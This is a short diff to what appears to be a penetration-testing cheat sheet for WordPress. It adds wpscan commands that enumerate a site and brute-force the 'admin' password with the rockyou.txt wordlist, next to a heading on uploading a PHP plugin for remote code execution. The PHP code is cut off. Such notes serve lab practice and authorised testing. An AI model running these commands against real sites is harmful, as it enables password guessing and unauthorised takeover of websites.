@@ -1,3 +1,10 @@
+### Enum
+```
+sudo wpscan --url url -e
+sudo wpscan --url url --usernames admin --passwords rockyou.txt
+```
+
+
 ### Upload Plugin to RCE
 ```
 <?php
